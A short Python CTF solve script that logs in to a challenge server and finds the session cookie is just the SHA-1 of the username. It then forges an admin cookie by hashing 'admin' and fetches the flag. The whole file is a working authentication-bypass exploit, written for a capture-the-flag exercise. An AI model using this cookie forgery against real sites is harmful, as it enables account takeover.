import os

cur_dir = os.path.dirname(__file__).replace("\\", "/")
cur_dir = "." + cur_dir.split("0xdeadbeef CTF")[-1] + "/"

import sys
sys.path.append(".")

from util import *

import requests
import hashlib

def SHA1(content: str) -> str:
    content = content.encode()
    result = hashlib.sha1(content)
    result = result.hexdigest()

    return result

url = "http://canaris.zapto.org:8002/"

r = requests.get(url)

data = {"username": "horse3903", "password": "horse3903"}
r = requests.post(url+"login", data=data)

cookies = r.history[0].cookies
cookies = dict(cookies)
login = cookies["login"]

encrypt = SHA1(data["username"])

assert encrypt == login

encrypt = SHA1("admin")
cookies = {"login": encrypt}

r = requests.get(url+"home", cookies=cookies)

content = r.text
result = content.split(": ")[-1]

dir = save_flag(result, __file__)